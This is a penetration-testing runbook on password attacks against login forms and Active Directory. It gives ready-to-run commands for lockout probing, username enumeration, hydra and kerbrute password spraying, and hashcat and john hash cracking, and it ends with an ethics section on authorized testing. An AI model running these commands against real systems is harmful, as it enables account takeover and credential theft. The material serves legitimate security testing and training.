---
title: "Password Attacks & Credential Abuse"
description: "Authorized runbook for password spraying, credential stuffing, and hash cracking within lockout thresholds, plus turning any valid credential into broader access."
phase: Generic Hacking
order: 2
tags:
  - passwords
  - brute-force
  - hashcat
  - credentials
tools:
  - hydra
  - hashcat
  - john
  - kerbrute
updated: 2026-10-01
---

Password attacks are about efficiency and stealth, not volume. A noisy brute-force that locks an account or trips a WAF has failed even if it eventually guesses right. This runbook assumes you are authorized to test authentication and have a client-provided test account.

## 1. Profile the login first

Before sending a single guess, measure the target:

```bash
# Measure rate limiting / lockout with a throwaway account
for i in $(seq 1 15); do
  curl -s -o /dev/null -w "%{http_code} %{time_total}\n" \
    -d "username=testuser&password=wrong$i" https://target/login
done
```

- Lockout after N attempts? Then spray, never brute.
- Does the error differ for **unknown user** vs **wrong password**? That is username enumeration — often the more valuable finding.
- Is MFA enforced, and what does the response look like pre/post validation?

## 2. Build a realistic user list

```bash
# Common corporate username patterns from a discovered name or email format
printf '%s\n' john.doe jdoe doe.john john_doe > users.txt

# Validate which usernames actually exist via the login error or an API
while read -r u; do
  code=$(curl -s -o /dev/null -w '%{http_code}' -d "username=$u&password=x" https://target/login)
  echo "$code $u"
done < users.txt | sort | uniq -c
```

## 3. Password spraying

One password against many users keeps you under lockout thresholds.

```bash
# Low and slow, stop on lockout
hydra -L users.txt -p 'Company@2026' -t 4 -W 3 -f <target> https-post-form \
  "/login:username=^USER^&password=^PASS^:F=invalid" -o spray.txt

# Round two with a second seasonal password, after a pause
hydra -L users.txt -p 'Welcome@2026' -t 4 -W 3 -f <target> https-post-form \
  "/login:username=^USER^&password=^PASS^:F=invalid" >> spray.txt
```

Rotate a short list of plausible passwords with pauses between rounds. The goal is one valid login, not a dump.

## 4. Kerberos spraying (AD environments)

```bash
# Find valid users (no lockout for invalid usernames by default)
kerbrute userenum --dc <dc-ip> -d corp.local users.txt -o kerb-users.txt

# Spray one password, respecting lockout policy
kerbrute passwordspray --dc <dc-ip> -d corp.local users.txt 'Company@2026'
```

## 5. Hash identification and cracking

```bash
# Identify first
hashid hashes.txt
hashcat --example-hashes 2>/dev/null

# Dictionary + mangling rules
hashcat -m 0 hashes.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule

# Slow hashes: target the algorithm, then use rules
hashcat -m 1800 unshadowed.txt rockyou.txt -r best64.rule

# John fallback with format detection
john --wordlist=rockyou.txt --rules hashes.txt
```

Attack order that saves time:

1. Dictionary + mangling rules
2. Mask attacks for known formats (`?u?l?l?l?d?d`)
3. Rule transforms on company/domain words
4. Combinator for two-word passwords

## 6. Full pipeline

```bash
# 1. Profile + enumerate users
for i in $(seq 1 15); do curl -s -o /dev/null -w "%{http_code} %{time_total}\n" -d "username=testuser&password=wrong$i" https://target/login; done
printf '%s\n' john.doe jdoe doe.john > users.txt

# 2. Spray (low and slow, stop on lockout)
hydra -L users.txt -p 'Company@2026' -t 4 -W 3 -f <target> https-post-form "/login:username=^USER^&password=^PASS^:F=invalid" -o spray.txt

# 3. Crack any recovered hashes
hashid hashes.txt
hashcat -m 0 hashes.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule

# 4. Test reuse of every recovered credential across services
```

## Ethics & legality

- Only test authentication systems you have written authorization for.
- Measure and respect lockout policies; never risk locking real users out.
- Use only breach corpora you are explicitly permitted to test.
- Stop at the first valid credential needed to prove impact and record it securely.
